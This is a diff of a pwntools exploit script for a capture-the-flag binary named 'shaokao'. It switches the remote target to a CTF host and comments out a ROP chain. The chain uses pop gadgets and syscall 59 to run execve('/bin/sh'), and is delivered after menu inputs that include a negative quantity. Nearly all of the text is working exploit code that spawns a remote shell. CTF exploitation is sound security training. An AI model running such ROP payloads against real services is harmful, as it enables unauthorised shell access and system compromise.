@@ -11,8 +11,8 @@ if debug:
     r = process("./shaokao")
     
 else:
-    host = "47.95.212.224"
-    r = connect(host,45323)#远程连接
+    host = "ctf.xidian.edu.cn:18403"
+    r = connect(host.split(':')[0],host.split(':')[1])#远程连接
     gdb_is =0
 
 if gdb_is:
@@ -22,26 +22,26 @@ if gdb_is:
     pass
 
 
-elf = ELF('./shaokao')
-pop_rdi = 0x40264f
-pop_rdi= 0x40264f
-pop_rsi = 0x40a67e
-pop_rax= 0x458827
-pop_rdx_rbx = 0x4a404b
-syscall = 0x0402404
-name = elf.sym['name']
+# elf = ELF('./shaokao')
+# pop_rdi = 0x40264f
+# pop_rdi= 0x40264f
+# pop_rsi = 0x40a67e
+# pop_rax= 0x458827
+# pop_rdx_rbx = 0x4a404b
+# syscall = 0x0402404
+# name = elf.sym['name']
 
-payload =  b'/bin/sh'.ljust(0x28, b'\x00') + p64(pop_rdi) + p64(name) + p64(pop_rax) + p64(59) + p64(pop_rdx_rbx) + p64(0)*2   + p64(pop_rsi) + p64(0)  + p64(syscall)
-                                                                        #调用号59 execve
-r.sendline(b'1')
-time.sleep(0.1)
-r.sendline(b'1')
-time.sleep(0.1)
-r.sendline(b'-1000000')
-time.sleep(0.1)
-r.sendline(b'4')
-time.sleep(0.1)
-r.sendline(b'5')
-time.sleep(0.1)
-r.sendline(payload)
+# payload =  b'/bin/sh'.ljust(0x28, b'\x00') + p64(pop_rdi) + p64(name) + p64(pop_rax) + p64(59) + p64(pop_rdx_rbx) + p64(0)*2   + p64(pop_rsi) + p64(0)  + p64(syscall)
+#                                                                         #调用号59 execve
+# r.sendline(b'1')
+# time.sleep(0.1)
+# r.sendline(b'1')
+# time.sleep(0.1)
+# r.sendline(b'-1000000')
+# time.sleep(0.1)
+# r.sendline(b'4')
+# time.sleep(0.1)
+# r.sendline(b'5')
+# time.sleep(0.1)
+# r.sendline(payload)
 r.interactive()
